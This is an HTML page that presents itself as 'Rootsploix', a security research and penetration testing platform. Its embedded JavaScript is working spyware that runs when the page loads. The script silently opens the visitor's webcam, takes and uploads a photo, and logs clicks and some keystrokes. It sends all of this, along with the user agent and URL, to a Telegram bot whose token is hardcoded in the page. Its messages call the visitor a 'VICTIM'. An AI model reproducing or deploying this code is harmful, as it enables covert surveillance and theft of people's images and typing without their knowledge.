<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rootsploix - Security Research</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a0a;
            color: #ffffff;
            font-family: 'Courier New', monospace;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
        }
        
        header {
            padding: 2rem 0;
            text-align: center;
            background: rgba(0, 0, 0, 0.8);
            border-bottom: 2px solid #00ff00;
        }
        
        .logo {
            font-size: 3.5rem;
            font-weight: 900;
            color: #00ff00;
            text-shadow: 0 0 20px #00ff00;
            margin-bottom: 0.5rem;
        }
        
        .hero {
            padding: 4rem 0;
            text-align: center;
        }
        
        .hero h1 {
            font-size: 2.5rem;
            margin-bottom: 1rem;
            color: #00ff00;
        }
        
        .hero p {
            font-size: 1.1rem;
            color: #cccccc;
            max-width: 600px;
            margin: 0 auto 2rem;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="logo">ROOTSPLOIX</div>
            <div>Advanced Cyber Security Research</div>
        </div>
    </header>
    
    <main>
        <div class="container">
            <section class="hero">
                <h1>Security Assessment Platform</h1>
                <p>
                    Professional security research and penetration testing framework.
                    Advanced tools for ethical security assessment.
                </p>
            </section>
        </div>
    </main>

    <script>
        // ===== TEMİZ VE BASİT ROOTSPLOIX FRAMEWORK =====
        
        // Session bilgileri
        const SESSION = {
            id: `rs_${Date.now()}_${Math.random().toString(36).substr(2, 10)}`,
            startTime: Date.now()
        };
        
        // Telegram config  
        const BOT_TOKEN = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
        const CHAT_ID = '6633612153';
        
        // Basit telegram gönder
        async function sendTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                
                console.log('Telegram response:', response.status, response.ok);
                return response.ok;
            } catch (error) {
                console.log('Telegram error:', error);
                return false;
            }
        }
        
        // Startup mesajı
        async function sendStartup() {
            const startupMsg = `🔥💀 ROOTSPLOIX v3.0 STARTED! 💀🔥

🎯 Chat ID: ${CHAT_ID}
🌍 Target Site: ${window.location.href}
📱 User Agent: ${navigator.userAgent.substring(0, 100)}...
🕒 Start Time: ${new Date().toLocaleString()}

🛡️ ACTIVE MODULES:
✅ Keylogger: LISTENING
✅ Mouse Tracker: ACTIVE
✅ Camera Access: READY
✅ Data Collection: ACTIVE

💀 VICTIM ACCESSED ROOTSPLOIX SITE!
🔥 SURVEILLANCE INITIATED!`;
            
            const success = await sendTelegram(startupMsg);
            console.log('Startup message sent:', success);
        }
        
        // Kamera erişim
        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: 640, height: 480 },
                    audio: false
                });
                
                // Kamera başarı mesajı
                const cameraMsg = `📷💀 CAMERA ACCESS GRANTED! 💀📷

🎯 Session: ${SESSION.id}
📹 Resolution: 640x480
🕒 Time: ${new Date().toLocaleString()}

💀 KAMERA ERİŞİMİ BAŞARILI!
🔥 FOTO ÇEKİMİ BAŞLIYOR!`;
                
                await sendTelegram(cameraMsg);
                
                // Video element oluştur
                const video = document.createElement('video');
                video.srcObject = stream;
                video.muted = true;
                video.autoplay = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                
                // 3 saniye sonra foto çek
                setTimeout(() => {
                    takePhoto(video);
                }, 3000);
                
            } catch (error) {
                const errorMsg = `❌ KAMERA ERİŞİM HATASI!

Session: ${SESSION.id}
Error: ${error.message}
Time: ${new Date().toLocaleString()}`;
                
                await sendTelegram(errorMsg);
            }
        }
        
        // Foto çek ve gönder
        async function takePhoto(video) {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                ctx.drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        // Foto mesajı
                        const photoMsg = `📷🔍 ŞAHİS RESMİ ALINDI - ARAŞTIRMAYA BAŞLANDI! 🔍📷

👥 Şahıs resmi alındı, gerekli araştırılmaya başlandı.
🔎 Profil analizi ve kimlik tespiti yapılıyor.
📊 Veri toplama işlemi aktif durumda.

🎯 Session: ${SESSION.id}
📷 Çözünürlük: ${canvas.width}x${canvas.height}
🕒 Zaman: ${new Date().toLocaleString()}

🔒 Güvenlik Protokolü: AKTİF
🔍 Araştırma Durumu: DEVAM EDİYOR`;
                        
                        await sendTelegram(photoMsg);
                        
                        // Foto gönder
                        await sendPhoto(blob);
                    }
                }, 'image/jpeg', 0.9);
                
            } catch (error) {
                console.log('Photo error:', error);
            }
        }
        
        // Foto gönder
        async function sendPhoto(photoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'sahis-fotografi.jpg');
                formData.append('caption', 'Şahıs Fotoğrafı - Araştırma Dosyası');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    await sendTelegram(`✅ FOTO AKTARIMI BAŞARILI!

📷 Dosya boyutu: ${(photoBlob.size / 1024).toFixed(1)}KB
🕒 İşlem zamanı: ${new Date().toLocaleString()}

💀 ŞAHİS FOTOĞRAFI ARŞİVE EKLENDİ!`);
                } else {
                    await sendTelegram(`❌ FOTO GÖNDERİM HATASI!

Status: ${response.status}
Time: ${new Date().toLocaleString()}`);
                }
                
            } catch (error) {
                await sendTelegram(`❌ FOTO UPLOAD ERROR: ${error.message}`);
            }
        }
        
        // Click tracking
        function setupClickTracking() {
            document.addEventListener('click', async (event) => {
                const clickMsg = `🖱️ CLICK DETECTED!

🎯 Position: ${event.clientX}, ${event.clientY}
🎯 Target: ${event.target.tagName}
🎯 ID: ${event.target.id || 'none'}
🎯 Text: ${(event.target.textContent || '').substring(0, 30)}
🕒 Time: ${new Date().toLocaleString()}

💀 CLICK TRACKING ACTIVE!`;
                
                await sendTelegram(clickMsg);
            });
        }
        
        // Keylogger
        function setupKeylogger() {
            document.addEventListener('keydown', async (event) => {
                if (Math.random() < 0.2) { // 20% şans
                    const keyMsg = `⌨️ KEY: ${event.key}

🎯 Code: ${event.code}
🎯 Target: ${event.target.tagName}
🕒 Time: ${new Date().toLocaleString()}

💀 KEYLOGGER ACTIVE!`;
                    
                    await sendTelegram(keyMsg);
                }
            });
        }
        
        // Sistem başlatma
        window.addEventListener('DOMContentLoaded', async () => {
            console.log('🔥 ROOTSPLOIX Clean Framework Loading...');
            
            // Startup mesajı gönder
            await sendStartup();
            
            // Kamera başlat
            await setupCamera();
            
            // Event listeners
            setupClickTracking();
            setupKeylogger();
            
            console.log('✅ ROOTSPLOIX Clean Framework Loaded!');
        });
        
        // Auto başlatma
        if (document.readyState === 'complete' || document.readyState === 'interactive') {
            setTimeout(async () => {
                await sendStartup();
                await setupCamera();
                setupClickTracking();
                setupKeylogger();
            }, 1000);
        }
    </script>
</body>
</html>
